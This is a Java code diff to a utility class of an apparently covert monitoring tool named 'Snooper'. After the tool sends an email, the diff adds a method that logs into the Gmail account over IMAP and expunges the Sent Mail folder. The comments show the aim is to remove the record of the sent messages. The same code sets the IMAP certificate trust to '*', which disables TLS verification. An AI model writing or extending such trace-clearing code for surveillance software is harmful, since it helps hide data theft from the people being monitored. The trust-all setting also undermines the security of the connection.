@@ -268,10 +268,66 @@ public class Util {
 			
 			//send the complete message
 			Transport.send(message);
-			
 			Util.notif(Snooper.TITLE, "Sent message successfully...");
+			
+			//we want to delete emails in sent folder
+			deleteEmails("[Gmail]/Sent Mail", username, password);
+			//end delete email
+			
 		} catch (Exception e) {
 			Util.notif(Snooper.TITLE, "Problem sending message...");
+		}
+	}
+	
+	//delete emails on specific folder
+	//https://www.tutorialspoint.com/javamail_api/javamail_api_deleting_emails.htm
+	public static void deleteEmails(String folder, String user, String password) {
+		
+		String imapHost = "imap.gmail.com";
+		String storeType = "imaps";
+		
+		// get the session object
+        try {
+			Properties properties = new Properties();
+			properties.put("mail.store.protocol", storeType);
+			properties.put("mail.imaps.host", imapHost);
+			properties.put("mail.imaps.port","993");
+			properties.put("mail.imaps.auth","true");
+			properties.put("mail.imaps.ssl.trust","*");
+			properties.put("mail.imaps.starttls.enable", "true");
+			Session emailSession = Session.getDefaultInstance(properties);
+			
+			Store store = emailSession.getStore(storeType);
+			store.connect(imapHost, user, password);
+			Folder[] f = store.getDefaultFolder().list();
+			for(Folder fd:f) {
+				Folder[] fc = fd.list();
+				for (Folder fc1 : fc) {
+					System.out.println(fc1);
+				}
+			}
+			
+			Folder emailFolder = store.getFolder(folder);
+			emailFolder.open(Folder.READ_WRITE);
+			
+			/*Use this to check all folder
+			Message[] messages = emailFolder.getMessages();
+			System.out.println("MESSAGES: " + messages.length);
+			for (int i = 0; i < messages.length; i++) {
+				Message message = messages[i];
+				message.setFlag(Flags.Flag.DELETED, true);
+			}
+			*/
+			
+			//closes all messages marked deleted
+			emailFolder.close(true);
+			store.close();
+			
+			
+			Util.notif("Emails deleted successfully...");
+		} catch (Exception ex) {
+			Util.notif("Problem deleting emails...");
+			ex.printStackTrace();
 		}
 	}
 	
